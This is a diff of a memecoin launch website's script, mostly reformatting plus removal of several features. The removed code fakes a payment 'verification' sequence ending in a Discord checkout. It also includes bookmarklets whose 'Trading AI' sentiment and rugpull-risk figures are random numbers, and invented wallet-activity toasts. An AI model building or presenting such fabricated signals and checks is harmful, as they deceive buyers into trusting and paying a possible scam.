-                else avatar.innerHTML = (symbol.charAt(0).toUpperCase() || 'W');
+                if (uploadedImageSrc) {
+                    avatar.innerHTML = `<img src="${uploadedImageSrc}" alt="Token Logo">`;
+                } else {
+                    avatar.innerHTML = (symbol.charAt(0).toUpperCase() || 'W');
+                }
             }
+
+            // Optional fee display for design only (no payment)
             const revokeMint = document.getElementById('revoke-mint')?.checked ? 0.10 : 0;
             const revokeFreeze = document.getElementById('revoke-freeze')?.checked ? 0.10 : 0;
             const burnLp = document.getElementById('burn-lp')?.checked ? 0.10 : 0;
             const totalOptionsFee = revokeMint + revokeFreeze + burnLp;
-            const total = 0.20 + liquidity + totalOptionsFee;
+            const baseLaunchFee = 0.20;
+            const total = baseLaunchFee + liquidity + totalOptionsFee;
             const optRow = document.getElementById('summary-options-row');
             const optEl = document.getElementById('summary-options');
             const totalEl = document.getElementById('summary-total');
             if (optRow && optEl) {
-                if (totalOptionsFee > 0) { optRow.classList.remove('hidden'); optEl.innerText = '+ ' + totalOptionsFee.toFixed(2) + ' SOL'; }
-                else optRow.classList.add('hidden');
+                if (totalOptionsFee > 0) {
+                    optRow.classList.remove('hidden');
+                    optEl.innerText = '+ ' + totalOptionsFee.toFixed(2) + ' SOL';
+                } else {
+                    optRow.classList.add('hidden');
+                }
             }
             if (totalEl) totalEl.innerText = total.toFixed(2) + ' SOL';
         }
+
+        /* Lightbox */
         let currentGalleryImgs = [];
         let currentImgIndex = 0;
         const lightbox = document.getElementById('lightbox');
         const lightboxImg = document.getElementById('lightbox-img');
+
         function openLightbox(clickedImg, gallerySelector) {
             if (!lightbox || !lightboxImg) return;
             const galleryElements = document.querySelectorAll(`${gallerySelector} .showcase-img`);
@@ -1936,9 +1562,12 @@
             if (e.key === 'ArrowRight') nextImage();
             if (e.key === 'ArrowLeft') prevImage();
         });
+
+        /* Motion / nav / counters */
         (function () {
             const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
             requestAnimationFrame(() => requestAnimationFrame(() => document.body.classList.add('loaded')));
+
             const bar = document.getElementById('scroll-progress');
             let ticking = false;
             function onScroll() {
@@ -1952,11 +1581,13 @@
             }
             window.addEventListener('scroll', onScroll, { passive: true });
             onScroll();
+
             window.addEventListener('scroll', () => {
                 const nav = document.getElementById('navbar');
                 if (!nav) return;
                 window.scrollY > 50 ? nav.classList.add('nav-scrolled') : nav.classList.remove('nav-scrolled');
             }, { passive: true });
+
             const revealables = document.querySelectorAll('[data-reveal]');
             if (reduced || !('IntersectionObserver' in window)) {
                 revealables.forEach(el => el.classList.add('revealed'));
@@ -1971,6 +1602,7 @@
                 }, { threshold: 0.12, rootMargin: '0px 0px -8% 0px' });
                 revealables.forEach(el => revealer.observe(el));
             }
+
             const glow = document.getElementById('cursor-glow');
             if (!reduced && glow && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
                 let tx = window.innerWidth / 2, ty = window.innerHeight / 2, cx = tx, cy = ty;
@@ -1985,6 +1617,7 @@
                     requestAnimationFrame(trail);
                 })();
             }
+
             function countUp(el) {
                 const target = parseFloat(el.dataset.count);
                 const suffix = el.dataset.suffix || '';
@@ -2002,11 +1635,17 @@
             if ('IntersectionObserver' in window) {
                 const counterObs = new IntersectionObserver((entries) => {
                     entries.forEach(entry => {
-                        if (entry.isIntersecting) { countUp(entry.target); counterObs.unobserve(entry.target); }
+                        if (entry.isIntersecting) {
+                            countUp(entry.target);
+                            counterObs.unobserve(entry.target);
+                        }
                     });
                 }, { threshold: 0.6 });
                 counters.forEach(el => counterObs.observe(el));
-            } else counters.forEach(countUp);
+            } else {
+                counters.forEach(countUp);
+            }
+
             const toggle = document.getElementById('nav-toggle');
             const menu = document.getElementById('mobile-menu');
             if (toggle && menu) {
@@ -2018,6 +1657,7 @@
                 menu.querySelectorAll('a').forEach(a => a.addEventListener('click', () => setMenu(false)));
                 document.addEventListener('keydown', (e) => { if (e.key === 'Escape') setMenu(false); });
             }
+
             const navLinks = Array.from(document.querySelectorAll('.nav-links a[href^="#"]'));
             const sections = navLinks.map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);
             if ('IntersectionObserver' in window && sections.length) {
@@ -2029,271 +1669,9 @@
                 }, { rootMargin: '-45% 0px -50% 0px' });
                 sections.forEach(s => spy.observe(s));
             }
+
             window.addEventListener('DOMContentLoaded', () => updatePreview());
         })();
-
-
-        function copyText(text, btnElement) {
-            const done = () => {
-                const originalText = btnElement.innerText;
-                btnElement.innerText = 'COPIED';
-                btnElement.classList.add('copied');
-                setTimeout(() => {
-                    btnElement.innerText = originalText;
-                    btnElement.classList.remove('copied');
-                }, 2000);
-            };
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(text).then(done).catch(() => {
-                    const ta = document.createElement('textarea');
-                    ta.value = text; document.body.appendChild(ta); ta.select();
-                    try { document.execCommand('copy'); } catch (e) {}
-                    ta.remove(); done();
-                });
-            } else { done(); }
-        }
-
-        function newOrderId() {
-            const n = Math.floor(Math.random() * 900000 + 100000);
-            return 'WIRE-' + n;
-        }
-
-        const payModal = document.getElementById('pay-modal');
-        const payStepSend = document.getElementById('pay-step-send');
-        const payStepVerify = document.getElementById('pay-step-verify');
-        const payStepResult = document.getElementById('pay-step-result');
-        let payTimers = [];
-        let currentFlow = null;
-        let currentOrderId = newOrderId();
-
-        const PAY_FLOWS = {
-            token: {
-                title: 'Complete your launch',
-                desc: 'Copy the amount and Order ID, then verify to open Discord checkout.',
-                unit: 'SOL',
-                amount: () => (document.getElementById('summary-total')?.innerText || '0.50 SOL').replace(' SOL', ''),
-                resultTitle: 'Launch order ready',
-                checks: [
-                    'Validating token metadata',
-                    'Locking quote amount',
-                    'Allocating Order ID',
-                    'Preparing Discord ticket',
-                    'Ready for support handoff'
-                ],
-                logs: [
-                    'quote: reading form totals...',
-                    'quote: network fee + options locked',
-                    'order: id minted',
-                    'ticket: payload packed',
-                    'handoff: open Discord to finish'
-                ]
-            },
-            bot: {
-                title: 'Buy Wire Memecoin Bot',
-                desc: 'Copy the amount and Order ID, then verify to open Discord checkout.',
-                unit: 'USD',
-                amount: () => '49.99',
-                resultTitle: 'License order ready',
-                checks: [
-                    'Selecting lifetime tier',
-                    'Locking license quote',
-                    'Allocating Order ID',
-                    'Preparing Discord ticket',
-                    'Ready for key issuance'
-                ],
-                logs: [
-                    'catalog: lifetime bot license',
-                    'quote: 49.99 USD locked',
-                    'order: id minted',
-                    'ticket: payload packed',
-                    'handoff: open Discord to finish'
-                ]
-            }
-        };
-
-        function clearPayTimers() { payTimers.forEach(clearTimeout); payTimers = []; }
-
-        function openPay(flowKey) {
-            const flow = PAY_FLOWS[flowKey];
-            if (!flow || !payModal) return;
-            currentFlow = flow;
-            clearPayTimers();
-            if (flowKey === 'token') updatePreview();
-            currentOrderId = newOrderId();
-            const amount = flow.amount();
-            document.getElementById('pay-title').innerText = flow.title;
-            document.getElementById('pay-desc').innerText = flow.desc;
-            document.getElementById('pay-amount-big').innerText = amount;
-            document.getElementById('pay-amount-unit').innerText = flow.unit;
-            document.getElementById('pay-amount-text').innerText = amount + ' ' + flow.unit;
-            document.getElementById('pay-address').innerText = currentOrderId;
-            document.getElementById('pay-result-title').innerText = flow.resultTitle;
-            payStepSend.classList.remove('hidden');
-            payStepVerify.classList.add('hidden');
-            payStepResult.classList.add('hidden');
-            payModal.classList.add('active');
-            document.body.style.overflow = 'hidden';
-        }
-        function closePay() {
-            clearPayTimers();
-            payModal?.classList.remove('active');
-            document.body.style.overflow = '';
-        }
-        function runPayVerification() {
-            const flow = currentFlow;
-            if (!flow) return;
-            clearPayTimers();
-            payStepSend.classList.add('hidden');
-            payStepResult.classList.add('hidden');
-            payStepVerify.classList.remove('hidden');
-            payModal.querySelector('.pay-card').scrollTop = 0;
-            const checksEl = document.getElementById('pay-checks');
-            checksEl.innerHTML = flow.checks.map(c =>
-                `<div class="pay-check"><span class="mark"></span><span class="t">${c}</span><span class="ms"></span></div>`
-            ).join('');
-            const checkEls = Array.from(checksEl.children);
-            const terminal = document.getElementById('pay-terminal');
-            terminal.innerHTML = '';
-            const fill = document.getElementById('pay-progress-fill');
-            fill.style.width = '0%';
-            const stepMs = 700;
-            const total = stepMs * flow.checks.length;
-            checkEls.forEach((el, i) => {
-                payTimers.push(setTimeout(() => {
-                    if (i > 0) {
-                        const prev = checkEls[i - 1];
-                        prev.classList.remove('active');
-                        prev.classList.add('done');
-                        prev.querySelector('.ms').innerText = (Math.floor(Math.random() * 180) + 40) + 'ms';
-                    }
-                    el.classList.add('active');
-                    fill.style.width = ((i + 1) / flow.checks.length) * 100 + '%';
-                }, i * stepMs));
-            });
-            const logGap = total / flow.logs.length;
-            flow.logs.forEach((line, i) => {
-                payTimers.push(setTimeout(() => {
-                    terminal.innerHTML += `<div>> ${line}</div>`;
-                    terminal.scrollTop = terminal.scrollHeight;
-                }, i * logGap + 120));
-            });
-            payTimers.push(setTimeout(() => {
-                const last = checkEls[checkEls.length - 1];
-                last.classList.remove('active');
-                last.classList.add('done');
-                last.querySelector('.ms').innerText = (Math.floor(Math.random() * 180) + 40) + 'ms';
-                fill.style.width = '100%';
-            }, total));
-            payTimers.push(setTimeout(() => {
-                document.getElementById('pay-result-msg').innerText =
-                    'Order ' + currentOrderId + ' is ready. Paste it in Discord to finish.';
-                payStepVerify.classList.add('hidden');
-                payStepResult.classList.remove('hidden');
-                payModal.querySelector('.pay-card').scrollTop = 0;
-            }, total + 400));
-        }
-        function showTokenPayment() { openPay('token'); }
-        function showAppPayment() { openPay('bot'); }
-        document.getElementById('pay-verify-btn')?.addEventListener('click', runPayVerification);
-        document.getElementById('pay-retry-btn')?.addEventListener('click', () => {
-            payStepResult.classList.add('hidden');
-            payStepSend.classList.remove('hidden');
-        });
-        document.getElementById('pay-copy-amount')?.addEventListener('click', function () {
-            copyText(document.getElementById('pay-amount-text').innerText, this);
-        });
-        document.getElementById('pay-copy-address')?.addEventListener('click', function () {
-            copyText(currentOrderId, this);
-        });
-        payModal?.querySelectorAll('[data-pay-close]').forEach(el => el.addEventListener('click', closePay));
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && payModal?.classList.contains('active')) closePay();
-        });
-
-        /* --- Bookmarklets: drag uses href, click demos on this page --- */
-        const FEE_BM = (function(){return `(function(){'use strict';
-if(document.getElementById('af-hud-text'))return;
-var color='#7c5cff',hotColor='#14f195';
-var style=document.createElement('style');
-style.textContent='@keyframes afGlow{0%,100%{box-shadow:0 0 8px '+color+'44}50%{box-shadow:0 0 16px '+color+'88}}@keyframes afHotGlow{0%,100%{box-shadow:0 0 12px '+hotColor+'66}50%{box-shadow:0 0 24px '+hotColor+'99}}.af-hl{outline:1.5px solid '+color+'99!important;outline-offset:-2px!important;border-radius:12px!important;animation:afGlow 3s ease-in-out infinite!important;position:relative!important}.af-hot{outline:2px solid '+hotColor+'cc!important;animation:afHotGlow 1s ease-in-out infinite!important}.af-hot-label{position:absolute;top:-11px;right:8px;z-index:100;font:800 9px/1 Inter,sans-serif;letter-spacing:.08em;text-transform:uppercase;padding:3px 8px;border-radius:4px;background:'+hotColor+'22;color:'+hotColor+';border:1px solid '+hotColor+'55;pointer-events:none}.af-hud{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:999999;display:flex;align-items:center;gap:12px;padding:10px 22px;background:rgba(5,6,10,.92);border:1px solid rgba(124,92,255,.35);border-radius:999px;font:700 12px/1 "JetBrains Mono",monospace;color:#fff;letter-spacing:1px;text-transform:uppercase;backdrop-filter:blur(10px)}.af-hud-dot{width:6px;height:6px;border-radius:50%;background:#14f195;box-shadow:0 0 8px #14f195}';
-document.head.appendChild(style);
-var hud=document.createElement('div');
-hud.className='af-hud';
-hud.innerHTML='<div class="af-hud-dot"></div><span id="af-hud-text">FEE RECLAIMER LIVE</span>';
-document.body.appendChild(hud);
-function mark(sel){document.querySelectorAll(sel).forEach(function(el){if(!el.classList.contains('af-hl'))el.classList.add('af-hl');});}
-mark('.axiom-box,.feature-card,.preview-panel,.form-container,.checkout-box,.pulse-cap,[data-pulse-token-address]');
-var rows=document.querySelectorAll('[data-pulse-token-address],.feature-card,.axiom-box');
-if(rows[0]&&!rows[0].classList.contains('af-hot')){rows[0].classList.add('af-hot');var lab=document.createElement('div');lab.className='af-hot-label';lab.textContent='FEES FOUND';rows[0].appendChild(lab);}
-document.getElementById('af-hud-text').textContent=document.querySelectorAll('.af-hl').length+' targets live';
-})();`;})();
-
-        const PULSE_BM = (function(){return `(function(){'use strict';
-if(document.getElementById('wire-pulse-root'))return;
-var css=document.createElement('style');
-css.textContent='#wire-pulse-root{position:fixed;right:16px;bottom:16px;z-index:999999;width:320px;font-family:Inter,system-ui,sans-serif;color:#fff}#wire-pulse-root *{box-sizing:border-box}#wire-pulse-card{position:relative;background:rgba(8,9,14,.94);border:1px solid rgba(34,211,238,.35);border-radius:16px;padding:14px 14px 12px;box-shadow:0 20px 60px rgba(0,0,0,.55);backdrop-filter:blur(16px)}#wire-pulse-card h5{margin:0 0 10px;font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#8fe9ff}#wire-pulse-card .row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-top:1px solid rgba(255,255,255,.08);font-size:12px;color:#a8adb8}#wire-pulse-card .row b{color:#fff;font-weight:600;font-family:ui-monospace,monospace}#wire-pulse-card .ok{color:#14f195}#wire-pulse-card .warn{color:#f59e0b}#wire-pulse-card .bad{color:#ff8a80}#wire-pulse-x{position:absolute;top:8px;right:10px;background:none;border:0;color:#7d8290;cursor:pointer;font-size:14px}';
-document.head.appendChild(css);
-var root=document.createElement('div');
-root.id='wire-pulse-root';
-root.innerHTML='<div id="wire-pulse-card"><button id="wire-pulse-x" type="button">×</button><h5>WIRE Trading AI</h5><div class="row"><span>Sentiment</span><b class="ok" id="wp-sent">BULL 72</b></div><div class="row"><span>Rugpull risk</span><b class="ok" id="wp-rug">LOW 11%</b></div><div class="row"><span>Twitter velocity</span><b id="wp-tw">+38/min</b></div><div class="row"><span>NLP scan</span><b id="wp-nlp">4.2 /sec</b></div><div class="row"><span>Signal</span><b class="warn" id="wp-sig">WATCH</b></div></div>';
-document.body.appendChild(root);
-document.getElementById('wire-pulse-x').onclick=function(){root.remove();css.remove();};
-var sent=72,rug=11,tw=38,nlp=4.2;
-setInterval(function(){
-  sent=Math.max(40,Math.min(92,sent+(Math.random()*8-4)));
-  rug=Math.max(4,Math.min(40,rug+(Math.random()*4-2)));
-  tw=Math.max(8,Math.min(90,tw+(Math.random()*10-5)));
-  nlp=Math.max(1.2,Math.min(9.5,nlp+(Math.random()*0.8-0.4)));
-  var se=document.getElementById('wp-sent'); if(!se)return;
-  se.textContent=(sent>60?'BULL ':'MIXED ')+Math.round(sent);
-  se.className=sent>60?'ok':'warn';
-  var rg=document.getElementById('wp-rug');
-  rg.textContent=(rug<20?'LOW ':'MED ')+Math.round(rug)+'%';
-  rg.className=rug<20?'ok':'warn';
-  document.getElementById('wp-tw').textContent='+'+Math.round(tw)+'/min';
-  document.getElementById('wp-nlp').textContent=nlp.toFixed(1)+' /sec';
-  var sg=document.getElementById('wp-sig');
-  if(sent>75&&rug<15){sg.textContent='LONG BIAS';sg.className='ok';}
-  else if(rug>28){sg.textContent='AVOID';sg.className='bad';}
-  else {sg.textContent='WATCH';sg.className='warn';}
-},1800);
-})();`;})();
-
-        function wireBookmarklet(el, code) {
-            if (!el) return;
-            el.setAttribute('href', 'javascript:' + encodeURIComponent(code));
-            el.addEventListener('click', function (e) {
-                e.preventDefault();
-                try { (0, eval)(code); } catch (err) { console.error(err); }
-            });
-        }
-        wireBookmarklet(document.getElementById('bm-fee'), FEE_BM);
-        wireBookmarklet(document.getElementById('bm-pulse'), PULSE_BM);
-
-        function showToast(title, sub) {
-            const box = document.getElementById('toast-container');
-            if (!box) return;
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = '<div class="status-dot"></div><div class="toast-text"><p>'+title+'</p><span>'+sub+'</span></div>';
-            box.appendChild(toast);
-            requestAnimationFrame(() => toast.classList.add('show'));
-            setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 400); }, 4200);
-        }
-        const toastLines = [
-            ['Wallet 7kQx...p2a1', 'activated Trading AI'],
-            ['Wallet 9mLw...c4e8', 'activated Fee Reclaimer'],
-            ['Wallet 3nRt...b8k2', 'opened a launch order']
-        ];
-        let ti = 0;
-        function loopToast() {
-            const t = toastLines[ti % toastLines.length];
-            showToast(t[0], 'Just ' + t[1] + '.');
-            ti++;
-            setTimeout(loopToast, 7000 + Math.random() * 5000);
-        }
-        setTimeout(loopToast, 2500);
-
     </script>
 </body>
 </html>
